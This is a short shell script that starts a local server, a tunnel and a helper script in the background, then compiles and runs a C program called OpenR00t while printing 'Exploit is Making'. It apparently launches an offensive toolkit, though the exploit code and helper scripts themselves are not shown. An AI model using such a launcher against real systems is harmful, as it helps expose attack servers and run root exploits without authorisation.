chmod +x localhost.sh
chmod +x geturl.sh
chmod +x mod.sh

# gnome-terminal -- bash -c "./localhost.sh; exec bash"
# gnome-terminal -- bash -c "./geturl.sh; exec bash"
# sleep 5
# gnome-terminal -- bash -c "./mod.sh; exec bash"

echo "localhost is running ...."
./localhost.sh &
sleep 2
echo "Tunnel is running ...."
./geturl.sh &
sleep 5
echo "Script is loading ...."
./mod.sh &

echo "Exploit is Making ...."

gcc -o OpenR00t OpenR00t.c -lcrypto
./OpenR00t